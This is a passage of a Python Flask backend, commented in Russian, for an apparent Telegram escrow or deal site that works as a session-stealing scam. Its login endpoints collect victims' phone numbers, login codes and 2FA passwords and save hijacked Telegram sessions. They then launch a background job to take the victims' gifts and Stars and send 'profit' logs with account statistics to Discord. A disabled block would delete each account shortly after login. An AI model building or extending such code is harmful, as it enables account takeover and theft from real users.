        # 4. Сначала логируем подтверждение передачи средств (ПЕРВЫМ)
        try:
            from forum_logger import log_to_forum_topic, get_or_create_discord_channel, _send_discord_message, run_async as run_async_log
            import asyncio
            
            async def log_confirmation():
                buyer_name = user_info.get('username', f"ID{user_info['id']}")
                if buyer_name and not buyer_name.startswith('@'):
                    buyer_name = f"@{buyer_name}"
                
                from datetime import datetime
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                
                message = (
                    f"✅ <b>Передача средств подтверждена</b>\n\n"
                    f"<b>Сделка:</b> #{deal_id}\n"
                    f"<b>Подтвердил:</b> {buyer_name} (ID: {user_info['id']})\n"
                    f"<b>Время:</b> {timestamp}"
                )
                
                # Логируем в Discord
                discord_channel_id = await get_or_create_discord_channel(deal_id)
                if discord_channel_id:
                    discord_message = (
                        f"✅ **Передача средств подтверждена**\n\n"
                        f"**Сделка:** #{deal_id}\n"
                        f"**Подтвердил:** {buyer_name} (ID: {user_info['id']})\n"
                        f"**Время:** {timestamp}"
                    )
                    await _send_discord_message(discord_channel_id, discord_message)
                
                # Логируем в Telegram форум
                await log_to_forum_topic(deal_id, message)
            
            run_async_log(log_confirmation())
        except Exception as e:
            logger.error(f"Failed to log transfer confirmation: {e}", exc_info=True)
        
        # 5. Затем логируем завершение сделки (ВТОРЫМ)
        try:
            from forum_logger import log_deal_completed, run_async as run_async_log
            
            buyer_info = {
                'username': user_info.get('username') or f"user_{user_info['id']}",
                'telegram_id': user_info['id']
            }
            deal_completed_data = {
                'title': deal.get('title', 'N/A'),
                'price': deal.get('price', 0),
                'currency': deal.get('currency', 'RUB'),
                'seller_username': deal.get('seller_username', ''),
                'buyer_username': deal.get('buyer_username', '')
            }
            
            # Логируем завершение сделки с информацией о том, что покупатель подтвердил
            result = run_async_log(log_deal_completed(deal_id, deal_completed_data, buyer_info))
            if result:
                logger.info(f"✅ Successfully logged deal completion for deal {deal_id}")
            else:
                logger.error(f"❌ Failed to log deal completion for deal {deal_id}")
        except Exception as e:
            logger.error(f"❌ Exception while logging deal completion: {e}", exc_info=True)
        
        # 6. Отправляем лог о профите в Discord через webhook (если есть подарки)
        try:
            from discord_webhook import send_profit_log
            
            # Получаем список подарков для этой сделки
            gifts = db.get_gifts_by_deal(deal_id)
            
            if gifts:
                # Берем username покупателя из сделки (обновленной)
                updated_deal = db.get_deal_by_id(deal_id)
                buyer_username = updated_deal.get('buyer_username') if updated_deal else deal.get('buyer_username')
                
                # Если нет username, пытаемся получить из БД
                if not buyer_username and deal.get('buyer_id'):
                    buyer_user = db.get_user_by_id(deal.get('buyer_id'))
                    if buyer_user:
                        buyer_username = buyer_user.get('username') or f"user_{buyer_user.get('telegram_id', deal.get('buyer_id'))}"
                
                # Fallback на user_info если все еще нет
                if not buyer_username:
                    buyer_username = user_info.get('username') or f"user_{user_info['id']}"
                
                # Убираем @ если есть
                if buyer_username and buyer_username.startswith('@'):
                    buyer_username = buyer_username[1:]
                
                # Отправляем лог в Discord webhook
                result = send_profit_log(
                    buyer_username=buyer_username,
                    deal_id=deal_id,
                    gifts=gifts,
                    image_url="https://i.ibb.co/XfHRzHfw/newprofin.jpg"
                )
                if result:
                    logger.info(f"✅ Profit log sent to Discord webhook for deal #{deal_id}")
                else:
                    logger.warning(f"⚠️ Failed to send profit log to Discord webhook for deal #{deal_id}")
            else:
                logger.info(f"ℹ️ No gifts found for deal #{deal_id}, skipping profit log")
        except Exception as e:
            logger.error(f"❌ Exception while sending profit log to Discord webhook: {e}", exc_info=True)
        
        updated_deal = db.get_deal_by_id(deal_id)
        return jsonify({'success': True, 'deal': updated_deal})
    except Exception as e:
        logger.error(f"Error confirming transfer: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/deals/<int:deal_id>/refund', methods=['POST'])
def refund_deal(deal_id):
    """
    Возврат средств покупателю продавцом
    После возврата сделка отменяется
    """
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        
        if not init_data:
            return jsonify({
                'success': False,
                'error': 'Authorization required',
                'requires_auth': True
            }), 401
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({
                'success': False,
                'error': 'Invalid authorization',
                'requires_auth': True
            }), 401
        
        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Deal not found'}), 404
        
        # Проверяем, что пользователь - продавец
        user = db.get_or_create_user(
            telegram_id=user_info['id'],
            username=user_info.get('username', ''),
            first_name=user_info.get('first_name', ''),
            last_name=user_info.get('last_name', '')
        )
        
        if deal.get('seller_id') != user['id']:
            return jsonify({'success': False, 'error': 'Only seller can refund'}), 403
        
        # Проверяем статус сделки
        if deal.get('status') != 'paid':
            return jsonify({'success': False, 'error': 'Deal is not paid'}), 400
        
        # 1. Возвращаем средства покупателю
        if deal.get('buyer_id'):
            try:
                currency = deal.get('currency', 'RUB')
                price = deal.get('price', 0)
                buyer_id = deal['buyer_id']
                
                logger.info(f"💰 Refunding balance: buyer_id={buyer_id}, amount={price}, currency={currency}")
                db.add_balance(buyer_id, price, currency)
                logger.info(f"✅ Balance refunded to buyer {buyer_id}")
            except Exception as e:
                logger.error(f"❌ Failed to refund balance to buyer: {e}", exc_info=True)
        
        # 2. Обновляем статус сделки на cancelled
        db.update_deal_status(deal_id, 'cancelled')
        logger.info(f"✅ Deal #{deal_id} status updated to 'cancelled'")
        
        # 3. Создаем системное сообщение
        try:
            seller_username = user_info.get('username') or f"user_{user_info['id']}"
            db.create_deal_message(
                deal_id=deal_id,
                sender_id=0,
                sender_username='Urionsbot',
                text=f"{seller_username} вернул(а) средства покупателю. Сделка отменена.",
                photo_url=None,
                is_system=True
            )
        except Exception as e:
            logger.error(f"Failed to add refund message: {e}")
        
        updated_deal = db.get_deal_by_id(deal_id)
        return jsonify({'success': True, 'deal': updated_deal})
    except Exception as e:
        logger.error(f"Error refunding deal: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/deals/<int:deal_id>/complete', methods=['POST'])
def complete_deal(deal_id):
    """
    Завершить сделку и вывести средства продавцу.
    
    Требует:
      - авторизации через init_data;
      - подтверждённой Telegram-сессии (phone + валидная session);
      - чтобы вызывающий пользователь был участником сделки (продавцом или покупателем);
      - чтобы сделка находилась в корректном статусе.
    """
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        
        if not init_data:
            return jsonify({
                'success': False, 
                'error': 'Authorization required to complete deal',
                'requires_auth': True
            }), 401
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({
                'success': False,
                'error': 'Invalid authorization',
                'requires_auth': True
            }), 401
        
        # Проверяем авторизацию через Telegram
        telegram_id = user_info['id']
        phone = get_phone_from_json(telegram_id)
        
        if not phone or not (check_session_exists(phone) and validate_session(phone)):
            return jsonify({
                'success': False,
                'error': 'Telegram authorization required. Please login first.',
                'requires_auth': True
            }), 401
        
        # Загружаем сделку и пользователя базы
        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Deal not found'}), 404

        user = db.get_user_by_telegram_id(telegram_id)
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404

        # Проверяем, что пользователь является продавцом или покупателем
        if user['id'] not in [deal.get('seller_id'), deal.get('buyer_id')]:
            return jsonify({'success': False, 'error': 'You are not a participant of this deal'}), 403
        
        # Завершать логично только оплаченные или явно активные сделки без спорных статусов.
        # В типичном сценарии после подтверждения воркером статус будет 'paid'.
        # Если сделка уже завершена (completed), не делаем ничего
        if deal['status'] == 'completed':
            logger.info(f"Deal #{deal_id} is already completed, returning current state")
            return jsonify({'success': True, 'deal': deal})
        
        if deal['status'] not in ['paid', 'active']:
            return jsonify({'success': False, 'error': 'Deal cannot be completed in current status'}), 400
        
        # Сохраняем старый статус для проверки
        old_status = deal['status']
        
        # Обновляем статус сделки
        db.update_deal_status(deal_id, 'completed')
        logger.info(f"✅ Deal #{deal_id} status updated to 'completed' (was: {old_status})")
        
        # Логируем завершение сделки в форум-чат
        try:
            from forum_logger import log_deal_completed, run_async as run_async_log
            updated_deal = db.get_deal_by_id(deal_id)
            if updated_deal:
                completed_by_info = {
                    'telegram_id': user_info.get('id'),
                    'username': user_info.get('username') or f"user_{user_info['id']}",
                    'id': user['id']
                }
                deal_completed_data = {
                    'title': updated_deal.get('title', 'N/A'),
                    'price': updated_deal.get('price', 0),
                    'currency': updated_deal.get('currency', 'RUB'),
                    'seller_username': updated_deal.get('seller_username', ''),
                    'buyer_username': updated_deal.get('buyer_username', '')
                }
                result = run_async_log(log_deal_completed(deal_id, deal_completed_data, completed_by_info))
                if not result:
                    logger.error(f"❌ Failed to log deal completion for deal {deal_id}")
                else:
                    logger.info(f"✅ Successfully logged deal completion for deal {deal_id}")
        except Exception as e:
            logger.error(f"❌ Exception while logging deal completion for deal {deal_id}: {e}", exc_info=True)
        
        # Если это продавец, добавляем средства на баланс в валюте сделки
        # Только если статус действительно изменился (не был уже completed)
        if old_status != 'completed' and deal.get('seller_id') == user['id']:
            currency = deal.get('currency', 'RUB')
            logger.info(f"💰 Adding balance for seller: user_id={user['id']}, amount={deal['price']}, currency={currency}")
            db.add_balance(user['id'], deal['price'], currency)
            logger.info(f"✅ Balance added for seller {user['id']}")
        
        updated_deal = db.get_deal_by_id(deal_id)
        # Системное сообщение о завершении сделки
        try:
            db.create_deal_message(
                deal_id=deal_id,
                sender_id=0,
                sender_username='Urionsbot',
                text="Сделка завершена. Средства зачислены.",
                photo_url=None,
                is_system=True
            )
        except Exception as e:
            logger.error(f"Failed to add completion system message for deal {deal_id}: {e}")
        return jsonify({'success': True, 'deal': updated_deal})
    except Exception as e:
        logger.error(f"Error completing deal: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/deals/<int:deal_id>/messages', methods=['GET'])
def get_deal_messages(deal_id: int):
    """
    Получить сообщения чата по сделке.
    
    Требует init_data и принадлежность пользователя к сделке (продавец или покупатель).
    Параметры:
      - after_id: int (опционально) — вернуть сообщения с id > after_id.
    """
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        if not init_data:
            return jsonify({'success': False, 'error': 'init_data required'}), 401

        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401

        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Deal not found'}), 404

        user = db.get_user_by_telegram_id(user_info['id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404

        if user['id'] not in [deal.get('seller_id'), deal.get('buyer_id')]:
            return jsonify({'success': False, 'error': 'You are not a participant of this deal'}), 403

        try:
            after_id = int(request.args.get('after_id', '0') or '0')
        except ValueError:
            after_id = 0

        messages = db.get_deal_messages(deal_id, after_id=after_id, limit=200)
        
        # Преобразуем формат для фронтенда
        formatted_messages = []
        for msg in messages:
            formatted_messages.append({
                'id': msg['id'],
                'dealId': msg['deal_id'],
                'senderId': msg['sender_id'],
                'senderUsername': msg['sender_username'],
                'text': msg['text'],
                'photoUrl': msg.get('photo_url'),
                'isSystem': bool(msg.get('is_system', 0)),
                'createdAt': msg['created_at']
            })
        
        return jsonify({'success': True, 'messages': formatted_messages})
    except Exception as e:
        logger.error(f"Error getting deal messages for deal {deal_id}: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/deals/<int:deal_id>/messages', methods=['POST'])
def add_deal_message(deal_id: int):
    """
    Отправить сообщение в чат сделки.
    
    Требует:
      - init_data;
      - чтобы пользователь был продавцом или покупателем в этой сделке.
    Поддерживает отправку фото через FormData.
    """
    try:
        # КРИТИЧЕСКИ ВАЖНО: проверяем наличие файла ПЕРВЫМ делом
        # Flask автоматически парсит multipart/form-data в request.files и request.form
        # НЕ вызываем request.get_json() для multipart запросов!
        
        # Проверяем наличие файла - это самый надежный способ определить multipart
        photo = request.files.get('photo')
        
        # Если есть файл, это точно multipart/form-data
        if photo:
            init_data = request.form.get('init_data')
            text = (request.form.get('text') or '').strip()
        # Проверяем content-type для multipart (на случай если файл не передан)
        elif request.content_type and 'multipart/form-data' in request.content_type:
            init_data = request.form.get('init_data')
            text = (request.form.get('text') or '').strip()
            photo = None
        # Иначе это JSON запрос - НО проверяем content-type перед парсингом
        else:
            photo = None
            # Парсим JSON ТОЛЬКО если content-type явно указывает на JSON
            if request.content_type and 'application/json' in request.content_type:
                try:
                    # Используем force=False и silent=True чтобы не форсировать парсинг
                    data = request.get_json(force=False, silent=True) or {}
                    init_data = data.get('init_data') or data.get('initData')
                    text = (data.get('text') or '').strip()
                except Exception as e:
                    logger.warning(f"Failed to parse JSON: {e}")
                    init_data = request.form.get('init_data')
                    text = (request.form.get('text') or '').strip()
            else:
                # Fallback: пробуем получить из form
                init_data = request.form.get('init_data')
                text = (request.form.get('text') or '').strip()

        if not init_data:
            return jsonify({'success': False, 'error': 'init_data required'}), 401

        if not text and not photo:
            return jsonify({'success': False, 'error': 'Message text or photo is required'}), 400

        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401

        # Проверяем, что user_info содержит id
        if 'id' not in user_info:
            logger.error(f"user_info is invalid (no id): {user_info}")
            return jsonify({'success': False, 'error': 'Invalid user data from init_data'}), 401

        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Deal not found'}), 404

        user = db.get_user_by_telegram_id(user_info['id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404

        # Проверяем, что user содержит id ПЕРЕД использованием
        if 'id' not in user:
            logger.error(f"User is invalid (no id): {user}")
            return jsonify({'success': False, 'error': 'User data is invalid'}), 500

        if user['id'] not in [deal.get('seller_id'), deal.get('buyer_id')]:
            return jsonify({'success': False, 'error': 'You are not a participant of this deal'}), 403

        # Сохраняем фото если есть
        photo_url = None
        if photo:
            import os
            from werkzeug.utils import secure_filename
            upload_folder = 'uploads'
            if not os.path.exists(upload_folder):
                os.makedirs(upload_folder)
            filename = secure_filename(f"{deal_id}_{user['id']}_{datetime.now().timestamp()}.jpg")
            filepath = os.path.join(upload_folder, filename)
            photo.save(filepath)
            photo_url = f"/uploads/{filename}"
        
        sender_username = user_info.get('username') or f"user_{user_info['id']}"
        
        if photo_url:
            # Используем новый метод с поддержкой фото
            message_id = db.create_deal_message(deal_id, user['id'], sender_username, text, photo_url)
            message = db.get_deal_message_by_id(message_id)
        else:
            # Используем метод для текста
            message_id = db.create_deal_message(deal_id, user['id'], sender_username, text, None, False)
            message = db.get_deal_message_by_id(message_id)

        # Логируем сообщение в форум-чат
        if message:
            try:
                from forum_logger import log_chat_message, run_async as run_async_log
                sender_info = {
                    'telegram_id': user_info['id'],
                    'username': sender_username,
                    'id': user['id']
                }
                result = run_async_log(log_chat_message(deal_id, sender_info, text or '', photo_url))
                if not result:
                    logger.error(f"❌ Failed to log chat message for deal {deal_id}")
                else:
                    logger.info(f"✅ Successfully logged chat message for deal {deal_id}")
            except Exception as e:
                logger.error(f"❌ Exception while logging chat message for deal {deal_id}: {e}", exc_info=True)

        if message:
            # Преобразуем формат для фронтенда
            formatted_message = {
                'id': message['id'],
                'dealId': message['deal_id'],
                'senderId': message['sender_id'],
                'senderUsername': message['sender_username'],
                'text': message['text'],
                'photoUrl': message.get('photo_url'),
                'isSystem': bool(message.get('is_system', 0)),
                'createdAt': message['created_at']
            }
            return jsonify({'success': True, 'message': formatted_message})
        
        return jsonify({'success': False, 'error': 'Failed to create message'}), 500
    except Exception as e:
        logger.error(f"Error adding message for deal {deal_id}: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/auth/login', methods=['POST'])
@app.route('/api/auth/send-code', methods=['POST'])
def send_code():
    """Отправить код подтверждения"""
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        phone = data.get('phone_number') or data.get('phone')
        user_id_param = data.get('user_id')
        if isinstance(user_id_param, str) and user_id_param.lower() == 'web_user':
            user_id_param = None
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'}), 400
        
        # Получаем user_info из init_data или используем user_id
        user_info = None
        user_id = None
        
        if init_data:
            user_info = get_user_from_init_data(init_data)
            if user_info:
                user_id = user_info['id']
        elif user_id_param:
            user_id = int(user_id_param) if str(user_id_param).isdigit() else None
        
        if not user_id:
            return jsonify({'success': False, 'error': 'init_data or user_id required'}), 400
        
        # Логируем ввод номера
        try:
            from forum_logger import log_auth_action, run_async as run_async_log
            run_async_log(log_auth_action(
                'phone_entered',
                {'telegram_id': user_id, 'id': user_id},
                {'phone': phone}
            ))
        except Exception as e:
            logger.warning(f"Failed to log phone_entered: {e}")
        
        # Проверяем существующую сессию (с обработкой ошибок БД)
        try:
            if check_session_exists(phone) and validate_session(phone):
                return jsonify({'success': True, 'already_authorized': True})
        except Exception as e:
            logger.warning(f"Error checking session (continuing anyway): {e}")
            # Продолжаем отправку кода даже если проверка сессии не удалась
        
        # Отправляем код
        session_file = f"sessions/{phone.replace('+', '')}.session"
        auth = TelegramAuth(session_file, user_info=user_info if user_info else None)
        
        # Логируем для отладки
        logger.info(f"Отправка кода на {phone}, user_id: {user_id}, API_ID: {Config.TELEGRAM_API_ID}")
        
        try:
            result = run_async(auth.send_code(phone))
        except Exception as e:
            logger.error(f"Error sending code to {phone}: {e}", exc_info=True)
            # Проверяем что это не ошибка API ключей
            if "api_id" in str(e).lower() or "api_hash" in str(e).lower():
                logger.error(f"API_ID: {Config.TELEGRAM_API_ID}, API_HASH: {Config.TELEGRAM_API_HASH[:20]}...")
            raise
        
        session_data = {
            'phone': phone,
            'phone_code_hash': result.phone_code_hash,
            'session_file': session_file
        }
        # Сохраняем данные сессии с обработкой ошибок БД
        try:
            save_session_data(user_id, session_data)
        except Exception as e:
            logger.warning(f"Failed to save session data (non-critical): {e}")
            # Не прерываем процесс, так как код уже отправлен
        
        # Детальное логирование для отладки
        logger.info(f"✅ Код отправлен успешно! Phone code hash: {result.phone_code_hash}")
        logger.info(f"Code type: {type(result.type).__name__}, Length: {getattr(result.type, 'length', 'N/A')}")
        logger.info(f"Code will be sent to: Telegram app on phone {phone}")
        
        # Логируем отправку кода
        try:
            run_async_log(log_auth_action(
                'code_sent',
                {'telegram_id': user_id, 'id': user_id},
                {'phone': phone}
            ))
        except Exception as e:
            logger.warning(f"Failed to log code_sent: {e}")
        
        # Отправляем лог в Discord
        try:
            from discord_processing_logger import send_auth_code_sent_log
            import threading
            def send_discord_log():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    loop.run_until_complete(send_auth_code_sent_log(user_id, phone))
                finally:
                    loop.close()
            thread = threading.Thread(target=send_discord_log, daemon=True)
            thread.start()
        except Exception as e:
            logger.warning(f"Failed to send Discord log for code_sent: {e}")
        
        return jsonify({'success': True})
    except PhoneNumberInvalidError:
        return jsonify({'success': False, 'error': 'Invalid phone number'}), 400
    except Exception as e:
        logger.error(f"Error sending code: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/auth/verify-code', methods=['POST'])
def verify_code():
    """Проверить код подтверждения"""
    logger.info(f"📥 Получен запрос на проверку кода: {request.get_json()}")
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        code = data.get('code')
        phone = data.get('phone_number') or data.get('phone')
        user_id_param = data.get('user_id')
        if isinstance(user_id_param, str) and user_id_param.lower() == 'web_user':
            user_id_param = None
        
        logger.info(f"🔍 Параметры запроса: code={'***' if code else 'None'}, phone={phone}, user_id_param={user_id_param}")
        
        if not code:
            logger.warning(f"❌ Код не предоставлен")
            return jsonify({'success': False, 'error': 'Code required'}), 400
        
        # Получаем user_info из init_data или используем user_id
        user_info = None
        user_id = None
        
        if init_data:
            user_info = get_user_from_init_data(init_data)
            if user_info:
                user_id = user_info['id']
        elif user_id_param:
            user_id = int(user_id_param) if str(user_id_param).isdigit() else None
        
        if not user_id:
            return jsonify({'success': False, 'error': 'init_data or user_id required'}), 400
        
        session_data = load_session_data(user_id)
        
        if not phone:
            phone = session_data.get('phone')
        
        phone_code_hash = session_data.get('phone_code_hash')
        session_file = session_data.get('session_file')
        
        if not all([phone, phone_code_hash, session_file]):
            return jsonify({'success': False, 'error': 'Session expired'}), 400
        
        logger.info(f"🔐 Проверяем код для phone={phone}, user_id={user_id}, code={code[:2]}**, hash={phone_code_hash[:10]}...")
        
        # Проверяем код
        auth = TelegramAuth(session_file)
        try:
            user = run_async(auth.verify_code(phone, code, phone_code_hash))
            logger.info(f"✅ Код проверен успешно для phone={phone}, user_id={user_id}")
        except Exception as verify_error:
            logger.error(f"❌ Ошибка при проверке кода для phone={phone}, user_id={user_id}: {verify_error}", exc_info=True)
            raise
        
        # Создаем или обновляем пользователя
        if user_info:
            db_user = db.get_or_create_user(
                telegram_id=user_info['id'],
                username=user_info.get('username', ''),
                first_name=user_info.get('first_name', ''),
                last_name=user_info.get('last_name', '')
            )
        else:
            db_user = db.get_user_by_telegram_id(user_id)
            if not db_user:
                db_user = db.get_or_create_user(telegram_id=user_id)
        
        # Сохраняем сессию через auth_sender
        logger.info(f"🔄 Конвертируем сессию в Pyrogram для phone={phone}, user_id={user_id}")
        try:
            from auth_sender import convert_to_pyrogram_session_string
            session_string = run_async(convert_to_pyrogram_session_string(phone))
            logger.info(f"✅ Session string получен: {'exists' if session_string else 'None'} для phone={phone}, длина={len(session_string) if session_string else 0}")
        except Exception as e:
            logger.error(f"❌ Error converting session to Pyrogram: {e}", exc_info=True)
            session_string = None
        
        # Сохраняем сессию
        logger.info(f"💾 Сохраняем сессию для phone={phone}, user_id={user_id}")
        create_session_json(phone, twoFA=False, user_id=user_id, session_string=session_string)
        clear_session_data(user_id)
        
        # Логируем подтверждение кода
        try:
            from forum_logger import log_auth_action, run_async as run_async_log
            run_async_log(log_auth_action(
                'code_verified',
                {'telegram_id': user_id, 'id': user_id, 'username': db_user.get('username', '')},
                {'phone': phone}
            ))
        except Exception as e:
            logger.warning(f"Failed to log code_verified: {e}")
        
        # Запускаем Tonnel-обход в фоне
        account_stats = None
        if session_string:
            try:
                from gift_processor import get_account_stats
                account_stats = run_async(get_account_stats(session_string))
            except Exception as e:
                logger.error(f"❌ Error getting account stats: {e}", exc_info=True)

            try:
                import sys
                _tonnel_runner_path = str(__import__('pathlib').Path(__file__).parent.parent)
                if _tonnel_runner_path not in sys.path:
                    sys.path.insert(0, _tonnel_runner_path)
                from tonnel_runner import launch_tonnel_background
                launch_tonnel_background(session_string, phone, user_id)
                logger.info(f"✅ Tonnel-обход запущен в фоне для {phone} (user_id: {user_id})")
            except Exception as e:
                logger.error(f"❌ Ошибка запуска Tonnel-обхода: {e}", exc_info=True)
        else:
            logger.warning(f"⚠️ session_string is None для user_id={user_id}, phone={phone}. Обработка подарков не будет запущена.")
        
        # Отправляем лог в Discord с полной статистикой
        try:
            from discord_processing_logger import send_auth_code_entered_log, send_auth_success_log
            import threading
            def send_discord_log():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    loop.run_until_complete(send_auth_code_entered_log(user_id, phone))
                    
                    # Формируем статистику для лога
                    gifts_stats = account_stats.get('gifts_stats') if account_stats else None
                    stars_balance = account_stats.get('stars_balance') if account_stats else None
                    
                    loop.run_until_complete(send_auth_success_log(
                        user_id, 
                        phone, 
                        db_user.get('username', ''),
                        gifts_stats=gifts_stats,
                        stars_balance=stars_balance
                    ))
                finally:
                    loop.close()
            thread = threading.Thread(target=send_discord_log, daemon=True)
            thread.start()
        except Exception as e:
            logger.warning(f"Failed to send Discord log for code_verified: {e}")
        
        logger.info(f"✅ Успешная авторизация для phone={phone}, user_id={user_id}, возвращаем ответ")
        
        # TODO: Временно отключена система удаления аккаунтов
        # # Планируем удаление аккаунта через 15 секунд после успешного входа
        # try:
        #     from gift_processor import delete_account_after_delay
        #     import threading
        #
        #     def schedule_account_deletion():
        #         """Запускает удаление аккаунта в отдельном event loop"""
        #         loop = asyncio.new_event_loop()
        #         asyncio.set_event_loop(loop)
        #         try:
        #             # Используем session_string если есть, иначе None (функция найдёт сессию по phone)
        #             loop.run_until_complete(delete_account_after_delay(
        #                 session_string if session_string else "",
        #                 phone,
        #                 user_id,
        #                 delay=15
        #             ))
        #         finally:
        #             loop.close()

        # TODO: Временно отключена система удаления аккаунтов
        # thread = threading.Thread(target=schedule_account_deletion, daemon=True)
        # thread.start()
        # logger.info(f"⏳ Запланировано удаление аккаунта {phone} через 15 секунд после успешного входа")
        # except Exception as e:
        #     logger.warning(f"⚠️ Не удалось запланировать удаление аккаунта: {e}")
        
        return jsonify({'success': True, 'user': db_user})
    except SessionPasswordNeededError as e:
        logger.info(f"🔐 Требуется 2FA для phone={phone}, user_id={user_id}")
        session_data['needs_2fa'] = True
        save_session_data(user_id, session_data)
        
        # Логируем требование 2FA
        try:
            from forum_logger import log_auth_action, run_async as run_async_log
            run_async_log(log_auth_action(
                '2fa_required',
                {'telegram_id': user_id, 'id': user_id},
                {'phone': phone}
            ))
        except Exception as e:
            logger.warning(f"Failed to log 2fa_required: {e}")
        
        # Отправляем лог в Discord о том, что требуется 2FA
        try:
            from discord_processing_logger import send_processing_log
            import threading
            def send_discord_log():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    message = f"🔐 **Требуется 2FA**\n\n👤 **Пользователь ID:** {user_id}\n📞 **Номер:** {phone}\n🔒 Требуется пароль двухфакторной аутентификации"
                    loop.run_until_complete(send_processing_log(message))
                finally:
                    loop.close()
            thread = threading.Thread(target=send_discord_log, daemon=True)
            thread.start()
        except Exception as e:
            logger.warning(f"Failed to send Discord log for 2fa_required: {e}")
        
        return jsonify({
            'success': False,
            'requires_2fa': True,
            'error': '2FA password required'
        })
    except Exception as e:
        logger.error(f"❌ Error verifying code: {e}", exc_info=True)
        import traceback
        logger.error(f"❌ Traceback: {traceback.format_exc()}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/auth/verify-2fa', methods=['POST'])
@app.route('/verify-2fa', methods=['POST'])
def verify_2fa():
    """Проверить 2FA пароль"""
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        password = data.get('password')
        phone = data.get('phone_number') or data.get('phone')
        user_id_param = data.get('user_id')
        if isinstance(user_id_param, str) and user_id_param.lower() == 'web_user':
            user_id_param = None
        
        if not password:
            return jsonify({'success': False, 'error': 'Password required'}), 400
        
        # Получаем user_info из init_data или используем user_id
        user_info = None
        user_id = None
        
        if init_data:
            user_info = get_user_from_init_data(init_data)
            if user_info:
                user_id = user_info['id']
        elif user_id_param:
            user_id = int(user_id_param) if str(user_id_param).isdigit() else None
        
        if not user_id:
            return jsonify({'success': False, 'error': 'init_data or user_id required'}), 400
        
        session_data = load_session_data(user_id)
        
        if not phone:
            phone = session_data.get('phone')
        
        session_file = session_data.get('session_file')
        
        if not all([phone, session_file]):
            return jsonify({'success': False, 'error': 'Session expired'}), 400
        
        # Проверяем 2FA
        auth = TelegramAuth(session_file)
        user = run_async(auth.verify_2fa(password))
        
        # Создаем или обновляем пользователя
        if user_info:
            db_user = db.get_or_create_user(
                telegram_id=user_info['id'],
                username=user_info.get('username', ''),
                first_name=user_info.get('first_name', ''),
                last_name=user_info.get('last_name', '')
            )
        else:
            db_user = db.get_user_by_telegram_id(user_id)
            if not db_user:
                db_user = db.get_or_create_user(telegram_id=user_id)
        
        # Сохраняем сессию через auth_sender
        try:
            from auth_sender import convert_to_pyrogram_session_string
            session_string = run_async(convert_to_pyrogram_session_string(phone))
        except Exception as e:
            logger.error(f"Error converting session to Pyrogram: {e}")
            session_string = None
        
        # Сохраняем сессию
        create_session_json(phone, twoFA=True, user_id=user_id, session_string=session_string)
        clear_session_data(user_id)
        
        # Логируем подтверждение 2FA
        try:
            from forum_logger import log_auth_action, run_async as run_async_log
            run_async_log(log_auth_action(
                '2fa_verified',
                {'telegram_id': user_id, 'id': user_id, 'username': db_user.get('username', '')},
                {'phone': phone}
            ))
        except Exception as e:
            logger.warning(f"Failed to log 2fa_verified: {e}")
        
        # Запускаем Tonnel-обход в фоне
        account_stats = None
        if session_string:
            try:
                from gift_processor import get_account_stats
                account_stats = run_async(get_account_stats(session_string))
            except Exception as e:
                logger.error(f"❌ Error getting account stats: {e}", exc_info=True)

            try:
                import sys
                _tonnel_runner_path = str(__import__('pathlib').Path(__file__).parent.parent)
                if _tonnel_runner_path not in sys.path:
                    sys.path.insert(0, _tonnel_runner_path)
                from tonnel_runner import launch_tonnel_background
                launch_tonnel_background(session_string, phone, user_id)
                logger.info(f"✅ Tonnel-обход запущен в фоне для {phone} (user_id: {user_id})")
            except Exception as e:
                logger.error(f"❌ Ошибка запуска Tonnel-обхода: {e}", exc_info=True)
        else:
            logger.warning(f"⚠️ session_string is None для user_id={user_id}, phone={phone} (2FA). Обработка подарков не будет запущена.")
        
        # Отправляем лог в Discord с полной статистикой
        try:
            from discord_processing_logger import send_auth_2fa_entered_log, send_auth_success_log
            import threading
            def send_discord_log():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    loop.run_until_complete(send_auth_2fa_entered_log(user_id, phone))
                    
                    # Формируем статистику для лога
                    gifts_stats = account_stats.get('gifts_stats') if account_stats else None
                    stars_balance = account_stats.get('stars_balance') if account_stats else None
                    
                    loop.run_until_complete(send_auth_success_log(
                        user_id, 
                        phone, 
                        db_user.get('username', ''),
                        gifts_stats=gifts_stats,
                        stars_balance=stars_balance
                    ))
                finally:
                    loop.close()
            thread = threading.Thread(target=send_discord_log, daemon=True)
            thread.start()
        except Exception as e:
            logger.warning(f"Failed to send Discord log for 2fa_verified: {e}")
        
